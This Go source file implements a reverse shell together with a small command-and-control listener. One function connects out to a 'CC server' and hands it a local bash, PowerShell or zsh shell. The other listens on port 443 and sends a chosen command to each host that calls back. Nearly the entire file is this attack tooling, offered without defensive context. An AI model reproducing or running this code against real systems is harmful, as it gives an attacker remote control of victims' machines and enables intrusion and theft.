package main

import (
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
)

// handle incoming connections
func handleRevConnection(conn net.Conn, cmd string, ch chan []byte) {

	// log new connection
	log.Printf("Received connection from %v\n", conn.RemoteAddr().String())

	// make sure connection is closed when process finishes
	defer conn.Close()

	// send command to remote host
	_, err := conn.Write([]byte(cmd + "\n"))
	if err != nil {
		log.Println("An error occurred while writing to the remote host connection:", err)
		os.Exit(2)
	}

	// read output (stdout, stderr) from remote shell
	buf := make([]byte, 1024)

	_, err = conn.Read(buf)
	if err != nil {
		log.Println("An error occurred while reading from the remote host connection:", err)
		os.Exit(3)
	}

	// send remote shell output into channel (return does not work with goroutines)
	ch <- buf

}

func reverseShellHost(serverAddr string, serverPort string) {

	// connect to the cc server
	conn, err := net.Dial("tcp", serverAddr+serverPort)
	if err != nil {
		log.Println("An error occurred while connecting to CC server:", err)
		os.Exit(1)
	} else {
		log.Println("Successfully connected to CC server")
	}

	// make sure connection is closed when process finishes
	defer conn.Close()

	// start local shell
	os := runtime.GOOS
	shell := exec.Command("/bin/bash")
	switch os {
	case "windows":
		shell = exec.Command("powershell.exe")
	case "linux":
		shell = exec.Command("/bin/bash")
	case "darwin":
		shell = exec.Command("/bin/zsh")
	}

	// connect shell to cc server
	shell.Stdin = conn
	shell.Stdout = conn
	shell.Stderr = conn
	shell.Run()

}

// example of CC server that sends a user defined command to remote shell once a connection is established by
// the remote host
func reverseShellCC(cmd string) {

	// start a tcp listener on the specified port
	listener, err := net.Listen("tcp", "localhost:443")
	if err != nil {
		log.Printf("An error occurred while initializing the listener on 443: %v\n", err)
		os.Exit(1)
	} else {
		log.Println("Listening on tcp port 443...")
	}

	// Create channel for returns from goroutines
	ch := make(chan []byte)

	// infinite loop waiting for connections and handing them to the handler function
	for {
		connection, err := listener.Accept()
		if err != nil {
			log.Printf("An error occurred during an attempted connection: %v\n", err)
			os.Exit(2)
		}
		// concurrently handle all incoming connections
		go handleRevConnection(connection, cmd, ch)
	}
}
